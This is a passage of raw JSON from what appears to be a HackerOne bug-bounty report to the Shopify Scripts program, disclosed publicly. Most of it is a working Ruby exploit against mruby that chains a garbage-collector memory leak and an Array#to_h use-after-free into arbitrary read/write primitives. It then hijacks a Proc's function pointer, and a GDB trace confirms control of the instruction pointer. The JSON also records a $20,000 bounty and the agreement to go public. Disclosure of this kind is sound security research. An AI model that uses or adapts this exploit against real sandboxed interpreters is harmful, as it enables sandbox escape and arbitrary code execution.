\u003cspan class=\"n\"\u003eplaceholder\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\n\u003cspan class=\"vg\"\u003e$lines\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\n\u003cspan class=\"vg\"\u003e$leak\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\n\u003cspan class=\"no\"\u003eGC\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003estart\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e# Leak a garbage collector chunk that contains mbr_object, leaking\u003c/span\u003e\n\u003cspan class=\"c1\"\u003e# a known RString structure and its -\u0026gt;ptr value.\u003c/span\u003e\n\u003cspan class=\"vg\"\u003e$state\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\n\u003cspan class=\"vg\"\u003e$lines\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003elines\u003c/span\u003e \u003cspan class=\"k\"\u003edo\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"n\"\u003el\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"vg\"\u003e$state\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e#puts \u0026#39;[*] Freeing $lines\u0026#39;\u003c/span\u003e\n    \u003cspan class=\"vg\"\u003e$lines\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eclear\u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e#puts \u0026quot;[*] Start GC\u0026quot;\u003c/span\u003e\n    \u003cspan class=\"no\"\u003eGC\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003estart\u003c/span\u003e\n    \u003cspan class=\"no\"\u003eGC\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003edisable\u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e# Create var to force GC to allocate a new mbr_object chunk.\u003c/span\u003e\n    \u003cspan class=\"mi\"\u003e1024\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003etimes\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"vg\"\u003e$b\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;a\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"vg\"\u003e$c\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\n    \u003cspan class=\"vg\"\u003e$str\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;X\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"mh\"\u003e0xff\u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e# Keep a sentinel to easily retrieve $str. Also used later for Read/Write primitive.\u003c/span\u003e\n    \u003cspan class=\"vg\"\u003e$b\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\xFE\\xFE\\xFE\\xFE\\xFE\\xFE\\xFE\\xFE\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\n    \u003cspan class=\"vg\"\u003e$state\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eelse\u003c/span\u003e\n    \u003cspan class=\"vg\"\u003e$leak\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"n\"\u003el\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\n\n\u003cspan class=\"vi\"\u003e@a\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e \u003cspan class=\"vg\"\u003e$leak\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003ebytesize\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eto_s\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"c1\"\u003e# String#index is buggy, so fallback to Array#index\u003c/span\u003e\n\u003cspan class=\"c1\"\u003e# Might be also buggy.\u003c/span\u003e\n\u003cspan class=\"n\"\u003eleak\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"vg\"\u003e$leak\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003ebytes\u003c/span\u003e\n\u003cspan class=\"n\"\u003ecan_i\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\n\u003cspan class=\"n\"\u003ecan_i\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eleak\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eindex\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mh\"\u003e0xfe\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"vi\"\u003e@a\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e\u003cspan class=\"no\"\u003ecan_i\u003c/span\u003e\u003cspan class=\"sh\"\u003e\n\n# This is the leaked RString.\nstr_obj = leak[can_i+24..can_i+24+47]\n\n# Leaked RString-\u0026gt;ptr value.\n$str_ptr = unpack_a(str_obj[-8..-1])\n# Leaked RString address.\n$str_addr=($str.object_id^0x10)\n#puts \u0026quot;[*] str: \u003c/span\u003e\u003cspan class=\"si\"\u003e#{\u003c/span\u003e\u003cspan class=\"vg\"\u003e$str\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eobject_id\u003c/span\u003e\u003cspan class=\"o\"\u003e^\u003c/span\u003e\u003cspan class=\"mh\"\u003e0x10\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"sh\"\u003e\u0026quot;\n#puts \u0026quot;[*] str-\u0026gt;ptr: \u003c/span\u003e\u003cspan class=\"si\"\u003e#{\u003c/span\u003e\u003cspan class=\"vg\"\u003e$str_ptr\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"sh\"\u003e\u0026quot;\n\n# Now use the Array#to_h use-after-free exploit.\nclass A\n  def to_ary\n    #puts \u0026quot;[*] to_ary\u0026quot;\n    # Free the Array.\n    $uaf.clear\n    # Create a smaller array that will be allocated at the same spot.\n    $uaf.replace $new_array\n    $new_array.clear\n\n    # Allocate the string right after the Array. The string will be used by #to_h as an\n    # element from the Array. The crafted element has a buggy class pointer used\n    # to throw an exception by #to_h. The buggy class pointer allow us to write an\n    # arbitrary pointer value anywhere (To an RString-\u0026gt;len in our case).\n    $a = \u0026quot;A\u0026quot;*(0x40*8)\n\n    # \u0026amp;str-\u0026gt;ptr[0]\n    write($a, pack($str_ptr), 0)\n    #  0x0: tt Not used\n    #  0x8: c = \u0026amp;EKlass\n    write($str, pack($str_ptr+0x30), 8)\n\n    # \u0026amp;Klass [0x30]:\n    # 0x00: tt = 9\n    # 0x08: c, Not used\n    # 0x10: gc, Not used\n    # 0x18: iv -\u0026gt; \u0026amp;IvTable\n    write($str, pack($str_ptr+0x60),0x30+0x18)\n                # \u0026amp;IVTable [0x60]:\n    # 0x00: n_buckets\n    write($str, pack(0x4), 0x60)\n    # 0x04: size\n    # 0x08: n_occupied\n    write($str, pack(0x1), 0x60 + 8)\n    # 0x10: ed_flags = [Occupied, Empty]\n    write($str, pack($str_ptr+0x90),0x60+0x10)\n    # 0x18: keys = [H(:__classid__), 0]\n    write($str, pack($str_ptr+0x90+4),0x60+0x18)\n    # 0x20: vals = [!0, (str-\u0026gt;len)]\n    write($str, pack($str_addr + 24-8),0x60+0x20)\n\n    #write($str, pack(0x1),48+48+4)\n    write($str, \u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\x08\\x08\\x20\\x80\u003c/span\u003e\u003cspan class=\"sh\"\u003e\u0026quot;,48+48+48)\n    # key items\n    write($str, \u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\x06\\x00\\x00\\x00\u003c/span\u003e\u003cspan class=\"sh\"\u003e\u0026quot;,48+48+48+4)\n    write($str, \u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\x06\\x00\\x00\\x00\u003c/span\u003e\u003cspan class=\"sh\"\u003e\u0026quot;,48+48+48+8)\n    write($str, \u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\x06\\x00\\x00\\x00\u003c/span\u003e\u003cspan class=\"sh\"\u003e\u0026quot;,48+48+48+12)\n    write($str, \u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\x06\\x00\\x00\\x00\u003c/span\u003e\u003cspan class=\"sh\"\u003e\u0026quot;,48+48+48+16)\n\n    #puts \u0026quot;[*] Done\u0026quot;\n    nil\n  end\nend\n\n#puts \u0026quot;[*] Alloc array\u0026quot;\n# Fill the holes\n300.times{$a = \u0026quot;C\u0026quot;*(0x100-1)}\n100.times{$a = \u0026quot;C\u0026quot;*(0x200-1)}\n# Create the array that will trigger the UAF\n$uaf = Array.new 68\n$uaf_len = Integer($uaf.length/2)\n$new_array = Array.new(0x40)\n$uaf.length.times{|i|$uaf[i] = [0,0]}\n$uaf[-2] = A.new\n\n#puts \u0026quot;[*] to_h Exploit\u0026quot;\nbegin\n        $uaf.to_h\nensure\n  # $str is now corrupted with a big length. Warning: Do not use regular\n  # string function or else: Crash. Bytes function (setbyte/getbyte/bytesize work well\n  # with corrupted strings).\n\n  # luckily the $str-\u0026gt;ptr is before the $str and $b RString :). We use this occasion\n  # to rewrite $b RString.\n  $off = $str_addr - $str_ptr - 48\n  # Remove the RSTRING_EMBED flag from $b.\n  $str.setbyte($off+1, 0)\n  $str.setbyte($off+2, 0)\n  # Set the $b length at 0xffffffff\n  write($str, pack(0xffffffff), $off+24)\n\n  # Set $b-\u0026gt;ptr\n  def set_ptr(p)\n    write($str, pack(p), $off+40)\n  end\n\n  # Read anywhere\n  def r(addr, n)\n    set_ptr(addr)\n    b = []\n    n.times {|i| b \u0026lt;\u0026lt; $b.getbyte(i)}\n    return b\n  end\n\n  # Write anywhere\n  def w(addr, data)\n    set_ptr(addr)\n    data.bytesize.times {|i| $b.setbyte(i, data.getbyte(i))}\n  end\n\n  # Create Proc object.\n  code = Proc.new{}\n  code_addr = code.object_id ^ 13\n  # Set the function to target.\n  w(code_addr + 2, \u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\x0c\u003c/span\u003e\u003cspan class=\"sh\"\u003e\u0026quot;)\n  w(code_addr + 24, \u0026#39;AAAAAAAA\u0026#39;)\n\n  # Win!\n  code.call\nend\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eResult from GDB\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e0x00007f5c5bc8153b in mrb_vm_exec (mrb=mrb@entry=0x1f00000004e0,\n    proc=\u0026lt;optimized out\u0026gt;, proc@entry=0x1f000011b320, pc=\u0026lt;optimized out\u0026gt;)\n    at /home/isra/devel/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1235\n1235            recv = m-\u0026gt;body.func(mrb, recv);\n(gdb) x m-\u0026gt;body.func\n0x4141414141414141:     Cannot access memory at address 0x4141414141414141\n(gdb)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2016-11-23T03:07:41.458Z","updated_at":"2016-11-23T03:07:41.458Z","actor":{"username":"isra17","cleared":false,"url":"/isra17","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1370003,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of Shopify Scripts and the mruby project!","markdown_message":"\u003cp\u003eThanks for helping improve the security of Shopify Scripts and the mruby project!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-12-16T19:46:13.252Z","updated_at":"2016-12-16T19:46:13.252Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"shopify-scripts"}},"bounty_amount":"20000.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"shopify-scripts","collaborator":{"username":"isra17","url":"/isra17"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1370004,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-12-16T19:46:22.732Z","updated_at":"2016-12-16T19:46:22.732Z","first_to_agree":true,"actor":{"username":"andrewdunbar","cleared":false,"url":"/andrewdunbar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/164/5b0e89675ed6dbb9df87223e9f8f58e2125bb56b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1370090,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-12-16T20:05:00.051Z","updated_at":"2016-12-16T20:05:00.051Z","actor":{"username":"isra17","cleared":false,"url":"/isra17","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1370091,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-12-16T20:05:00.096Z","updated_at":"2016-12-16T20:05:00.096Z","actor":{"username":"isra17","cleared":false,"url":"/isra17","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}